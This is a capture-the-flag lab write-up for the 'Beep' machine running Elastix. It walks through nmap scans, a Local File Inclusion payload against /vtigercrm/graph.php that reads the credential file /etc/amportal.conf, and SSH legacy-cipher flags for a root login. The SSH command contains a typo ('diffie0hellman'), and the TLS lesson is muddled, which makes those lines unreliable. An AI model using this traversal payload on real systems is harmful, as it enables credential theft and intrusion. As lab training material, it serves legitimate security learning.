## Beep

### Lab Details 

- Difficulty: Easy
- Type: Web app, Webb exploit, SSH, Linux

#### Tasks

Q1: Which Linux distribution is the target machine running?
 - `nmap target_ip -sT -A -p- -T4`
 ```
    443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
    |_http-title: Elastix - Login page
    | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
    | Not valid before: 2017-04-07T08:22:08
    |_Not valid after:  2018-04-07T08:22:08
    | http-robots.txt: 1 disallowed entry 
    |_/
    |_http-server-header: Apache/2.2.3 (CentOS)
    |_ssl-date: 2025-05-16T02:00:43+00:00; -1m01s from scanner time.
```
 - CentOS

Q2: What version of TLS is the web application on TCP port 443 using?
 - `nmap target_ip -sV -script ssl-enum-ciphers -p 443`
```
    |   TLSv1.0: 
    |     ciphers: 
    |       TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA (dh 1024) - F
    |       TLS_DHE_RSA_WITH_AES_128_CBC_SHA (dh 1024) - F
```

Q3: What is the name of the software that's hosting a webserver on 443?
 - can be found in first nmap output or visit the app via URL
 - elastix

Q4: Which Elastix endpoint is vulnerable to a Local File Inclusion?
 - according to https://www.exploit-db.com/exploits/37637 
 - `#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
 - and based on the exploit above the vulnerable endpoint is located at /vtigercrm/graph.php

Q5: What is the name of the FreePBX configuration file that contains the database configuration?
 - according to the exploit we are fetch the file called amportal.conf which contains db configurations

Q6: What additional flag is needed when attempting to SSH as root to the target machine due to a "no matching key exchange method found" error? It starts with -o and ends with -sha1.
 - when trying to ssh as root to target we get below error 
```
ssh root@10.10.10.7            
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```
 - after searching online, to connect using legacy cipher ssh will require the cipher to be specified
 - we need both server and host cipher to be specified inorder to connect
 - `ssh -oKexAlgorithms=+diffie0hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa root@target_ip`

Q7&8: Flags for user fanis and root 
 - located at /root/root.txt and /home/fanis/users.txt

#### Lesson Learned
- Check web app TLS version and if TLS version is 1 or 2 update it, on firefox set security.tls.version.min to 1 in about:config
- Need to read and understand the exploit, read it carefully
- Need to understand the output of an exploit
- How to connect to remote when using legacy cipher`ssh -oKexAlgorithms=+diffie0hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa root@target_ip`
